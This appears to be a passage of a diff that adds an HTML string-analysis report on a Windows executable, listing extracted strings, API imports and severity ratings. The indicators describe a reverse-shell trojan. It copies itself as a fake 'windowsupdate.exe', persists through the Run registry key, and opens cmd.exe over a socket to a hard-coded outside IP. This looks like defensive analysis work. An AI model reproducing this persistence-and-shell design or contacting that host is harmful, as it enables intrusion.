+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Filename (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">%s\personal\windowsupdate.exe</td>
+            <td class="muted" style="width:250px;"><code>_createFolderAndCopySelf</code>, <code>_createRegistryRunEntry</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">%s\personal</td>
+            <td class="muted" style="width:250px;"><code>_createFolderAndCopySelf</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#dc2626; font-weight:bold;">High</span></td>
+            <td>Registry Key (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">Software\Microsoft\Windows\CurrentVersion\Run</td>
+            <td class="muted" style="width:250px;"><code>_createRegistryRunEntry</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Encoded Data (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">WindowsUpdateProgram</td>
+            <td class="muted" style="width:250px;"><code>_createRegistryRunEntry</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#dc2626; font-weight:bold;">High</span></td>
+            <td>IP Address (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">188.127.247.130</td>
+            <td class="muted" style="width:250px;"><code>_openShellConnection</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#dc2626; font-weight:bold;">High</span></td>
+            <td>Command (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">cmd.exe</td>
+            <td class="muted" style="width:250px;"><code>_openShellConnection</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">Unknown error</td>
+            <td class="muted" style="width:250px;"><code>__matherr</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">_matherr(): %s in %s(%g, %g)  (retval=%g)
+</td>
+            <td class="muted" style="width:250px;"><code>__matherr</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">Argument domain error (DOMAIN)</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Library/Runtime String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">Argument singularity (SIGN)</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Library/Runtime String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">Overflow range error (OVERFLOW)</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Library/Runtime String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">The result is too small to be represented (UNDERFLOW)</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Library/Runtime String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">Total loss of significance (TLOSS)</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Library/Runtime String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">Partial loss of significance (PLOSS)</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Library/Runtime String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">Mingw-w64 runtime failure:
+</td>
+            <td class="muted" style="width:250px;"><code>___report_error</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Library/Runtime String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">Address %p has no image-section</td>
+            <td class="muted" style="width:250px;"><code>_mark_section_writable</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">  VirtualQuery failed for %d bytes at address %p</td>
+            <td class="muted" style="width:250px;"><code>_mark_section_writable</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">  VirtualProtect failed with code 0x%x</td>
+            <td class="muted" style="width:250px;"><code>_mark_section_writable</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">  Unknown pseudo relocation protocol version %d.
+</td>
+            <td class="muted" style="width:250px;"><code>__pei386_runtime_relocator</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">  Unknown pseudo relocation bit size %d.
+</td>
+            <td class="muted" style="width:250px;"><code>__pei386_runtime_relocator</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.
+</td>
+            <td class="muted" style="width:250px;"><code>__pei386_runtime_relocator</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">(null)</td>
+            <td class="muted" style="width:250px;"><code>___pformat_puts</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">Infinity</td>
+            <td class="muted" style="width:250px;"><code>___gdtoa</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Filename (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">msvcrt.dll</td>
+            <td class="muted" style="width:250px;"><code>_init_codepage_func</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">GCC: (i686-posix-dwarf-rev0, Built by MinGW-Builds project) 14.2.0</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">RegCloseKey</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">RegOpenKeyExA</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">RegSetValueExA</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">CloseHandle</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">CopyFileA</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Encoded Data (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">CreateDirectoryA</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">CreateProcessA</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">DeleteCriticalSection</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Encoded Data (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">EnterCriticalSection</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">FreeLibrary</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">GetLastError</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">GetModuleFileNameA</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Encoded Data (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">GetModuleHandleA</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Encoded Data (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">GetModuleHandleW</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">GetProcAddress</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">InitializeCriticalSection</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Encoded Data (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">IsDBCSLeadByteEx</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Encoded Data (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">LeaveCriticalSection</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">LoadLibraryA</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Potential Encryption/Obfuscation (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">MultiByteToWideChar</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Potential Encryption/Obfuscation (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">SetUnhandledExceptionFilter</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">Sleep</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">TlsGetValue</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">VirtualProtect</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">VirtualQuery</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Potential Encryption/Obfuscation (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">WideCharToMultiByte</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">_amsg_exit</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">_cexit</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">_errno</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">_exit</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">_initterm</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">_onexit</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">abort</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">calloc</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">fprintf</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">fputc</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">fwrite</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">getenv</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">localeconv</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">malloc</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">memcpy</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">memset</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">setlocale</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">signal</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">strchr</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">strerror</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">strlen</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">strncmp</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">vfprintf</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">wcslen</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">WSAConnect</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">WSASocketA</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">WSAStartup</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">htons</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">inet_addr</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Filename (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">ADVAPI32.dll</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Filename (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">KERNEL32.dll</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Filename (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">WS2_32.dll</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#dc2626; font-weight:bold;">High</span></td>
+            <td>Command (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">cmd.exe /C ping -n 1 google.com &gt;nul 2&gt;&amp;1</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Filename (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">%s\\personal\\windowsupdate.exe</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">%s\\personal</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Potential Encryption/Obfuscation (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">Software\\Microsoft\\Windows\\CurrentVersion\\Run</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">UWVS1</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">C 9C$~</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">S 9S$~</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">F 9F$~</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">=UUUUw</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">9D$8s&lt;</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">9l$0s</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">s(+T$p</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">D$P)D$d</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">D$Xt&amp;</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">T$h9P</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">;\$Xsq</td>
+            <td class="muted" style="width:250px;"></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">_matherr(): %s in %s(%g, %g)  (retval=%g)</td>
+            <td class="muted" style="width:250px;"><code>__matherr</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>Library/Runtime String (ASCII)</td>
+            <td style="word-break:break-all; font-family:'Fira Code', 'Cascadia Code', monospace; font-size:12px;">Mingw-w64 runtime failure:</td>
+            <td class="muted" style="width:250px;"><code>___report_error</code></td>
+        </tr>
+        <tr>
+            <td><span style="color:#64748b; font-weight:bold;">Low</span></td>
+            <td>String (ASCII)</td>
